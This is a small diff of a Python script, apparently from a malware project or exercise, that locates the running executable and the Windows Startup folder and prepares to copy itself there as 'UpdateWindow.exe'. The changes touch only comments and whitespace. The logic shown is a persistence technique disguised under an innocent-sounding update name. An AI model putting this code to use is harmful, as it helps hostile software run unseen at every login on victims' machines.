@@ -6,11 +6,12 @@ import shutil
 def path_manipulation():
     
  try:
-
-    exe_file = Path(sys.executable) # provide path to the Python interpreter being used to run the script
+    # provide the path of the process that is currently running 
+    exe_file = Path(sys.executable)
   
-    # full path to user start up folder
+    # full path to user start up folder for Window
     start_up_folder = Path(os.environ['APPDATA']) /'Microsoft'/'Windows'/'Start Menu'/'Programs'/'Startup' 
+    
     
     duplicate_exe_file = start_up_folder / "UpdateWindow.exe"
     
